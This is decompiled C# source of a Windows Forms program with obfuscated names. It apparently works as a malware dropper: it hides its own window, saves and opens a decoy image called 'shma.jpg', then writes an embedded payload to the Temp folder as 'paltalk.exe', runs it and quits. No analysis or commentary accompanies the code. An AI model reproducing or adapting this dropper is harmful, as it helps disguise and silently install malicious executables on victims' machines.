using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns0;
using ns2;

namespace ns1;

internal sealed class Form1 : Form
{
	private static List<WeakReference> list_0 = new List<WeakReference>();

	private IContainer icontainer_0;

	private Timer timer_0;

	[DebuggerNonUserCode]
	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		smethod_0(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private unsafe static void smethod_0(object object_0)
	{
		void* ptr = stackalloc byte[18];
		lock (list_0)
		{
			((byte*)ptr)[16] = ((list_0.Count == list_0.Capacity) ? ((byte)1) : ((byte)0));
			if (((byte*)ptr)[16] != 0)
			{
				*(int*)ptr = 0;
				byte* num = (byte*)ptr + 4;
				*(int*)((byte*)ptr + 8) = checked(list_0.Count - 1);
				*(int*)num = 0;
				while (true)
				{
					int num2 = *(int*)((byte*)ptr + 4);
					*(int*)((byte*)ptr + 12) = *(int*)((byte*)ptr + 8);
					if (num2 > *(int*)((byte*)ptr + 12))
					{
						break;
					}
					WeakReference weakReference = list_0[*(int*)((byte*)ptr + 4)];
					((byte*)ptr)[16] = (weakReference.IsAlive ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[16] != 0)
					{
						((byte*)ptr)[17] = ((*(int*)((byte*)ptr + 4) != *(int*)ptr) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[17] != 0)
						{
							list_0[*(int*)ptr] = list_0[*(int*)((byte*)ptr + 4)];
						}
						checked
						{
							(*unchecked((int*)ptr))++;
						}
					}
					checked
					{
						(*unchecked((int*)((byte*)ptr + 4)))++;
					}
				}
				list_0.RemoveRange(*(int*)ptr, checked(list_0.Count - *unchecked((int*)ptr)));
				list_0.Capacity = list_0.Count;
			}
			list_0.Add(new WeakReference(RuntimeHelpers.GetObjectValue(object_0)));
		}
	}

	[DebuggerNonUserCode]
	void Form.Dispose(bool disposing)
	{
		try
		{
			if ((disposing && icontainer_0 != null) ? true : false)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		icontainer_0 = new Container();
		vmethod_1(new Timer(icontainer_0));
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(292, 273);
		((Form)this).set_ClientSize(clientSize);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Timer vmethod_0()
	{
		return timer_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_1(Timer timer_1)
	{
		EventHandler eventHandler = method_0;
		if (timer_0 != null)
		{
			timer_0.remove_Tick(eventHandler);
		}
		timer_0 = timer_1;
		if (timer_0 != null)
		{
			timer_0.add_Tick(eventHandler);
		}
	}

	private unsafe void Form1_Load(object sender, EventArgs e)
	{
		void* ptr = stackalloc byte[12];
		int try0006_dispatch = -1;
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0006_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					*(int*)ptr = -2;
					goto IL_000f;
				case 221:
					{
						*(int*)((byte*)ptr + 4) = *(int*)((byte*)ptr + 8);
						if (*(int*)ptr > -2)
						{
							switch (*(int*)ptr)
							{
							case 1:
								break;
							default:
								goto end_IL_0006;
							}
						}
						int num = *(int*)((byte*)ptr + 4) + 1;
						*(int*)((byte*)ptr + 4) = 0;
						switch (num)
						{
						case 1:
							break;
						case 2:
							goto IL_000f;
						case 3:
							goto IL_001b;
						case 4:
							goto IL_0027;
						case 5:
							goto IL_0033;
						case 6:
							goto IL_0047;
						case 7:
							goto IL_0059;
						case 8:
							goto IL_0073;
						case 9:
							goto end_IL_0006_2;
						default:
							goto end_IL_0006;
						case 10:
							goto end_IL_0006_3;
						}
						goto default;
					}
					IL_0073:
					*(int*)((byte*)ptr + 8) = 8;
					Process.Start(text + "\\shma.jpg");
					break;
					IL_0059:
					*(int*)((byte*)ptr + 8) = 7;
					((Image)Class5.smethod_2()).Save(Path.Combine(text, "shma.jpg"));
					goto IL_0073;
					IL_000f:
					*(int*)((byte*)ptr + 8) = 2;
					((Form)this).set_ShowInTaskbar(false);
					goto IL_001b;
					IL_001b:
					*(int*)((byte*)ptr + 8) = 3;
					((Form)this).set_ShowIcon(false);
					goto IL_0027;
					IL_0027:
					*(int*)((byte*)ptr + 8) = 4;
					((Control)this).set_Visible(true);
					goto IL_0033;
					IL_0033:
					*(int*)((byte*)ptr + 8) = 5;
					((Form)this).set_Opacity(0.0);
					goto IL_0047;
					IL_0047:
					*(int*)((byte*)ptr + 8) = 6;
					text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString();
					goto IL_0059;
					end_IL_0006_2:
					break;
				}
				*(int*)((byte*)ptr + 8) = 9;
				vmethod_0().Start();
				break;
				end_IL_0006:;
			}
			catch (object obj) when ((obj is Exception) & (*(int*)ptr != 0) & (*(int*)((byte*)ptr + 4) == 0))
			{
				ProjectData.SetProjectError((Exception)obj);
				try0006_dispatch = 221;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0006_3:
			break;
		}
		if (*(int*)((byte*)ptr + 4) != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private unsafe void method_0(object sender, EventArgs e)
	{
		void* ptr = stackalloc byte[12];
		int try0006_dispatch = -1;
		string text = default(string);
		string temp = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0006_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					*(int*)ptr = -2;
					goto IL_000f;
				case 167:
					{
						*(int*)((byte*)ptr + 4) = *(int*)((byte*)ptr + 8);
						if (*(int*)ptr > -2)
						{
							switch (*(int*)ptr)
							{
							case 1:
								break;
							default:
								goto end_IL_0006;
							}
						}
						int num = *(int*)((byte*)ptr + 4) + 1;
						*(int*)((byte*)ptr + 4) = 0;
						switch (num)
						{
						case 1:
							break;
						case 2:
							goto IL_000f;
						case 3:
							goto IL_0024;
						case 4:
							goto IL_003e;
						case 5:
							goto IL_004f;
						case 6:
							goto end_IL_0006_2;
						default:
							goto end_IL_0006;
						case 7:
							goto end_IL_0006_3;
						}
						goto default;
					}
					IL_004f:
					*(int*)((byte*)ptr + 8) = 5;
					File.WriteAllBytes(text, Class5.smethod_1());
					break;
					IL_003e:
					*(int*)((byte*)ptr + 8) = 4;
					text = temp + "paltalk.exe";
					goto IL_004f;
					IL_000f:
					*(int*)((byte*)ptr + 8) = 2;
					vmethod_0().set_Interval(1000);
					goto IL_0024;
					IL_0024:
					*(int*)((byte*)ptr + 8) = 3;
					temp = ((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_Temp();
					goto IL_003e;
					end_IL_0006_2:
					break;
				}
				*(int*)((byte*)ptr + 8) = 6;
				Process.Start(text);
				ProjectData.EndApp();
				break;
				end_IL_0006:;
			}
			catch (object obj) when ((obj is Exception) & (*(int*)ptr != 0) & (*(int*)((byte*)ptr + 4) == 0))
			{
				ProjectData.SetProjectError((Exception)obj);
				try0006_dispatch = 167;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0006_3:
			break;
		}
		if (*(int*)((byte*)ptr + 4) != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
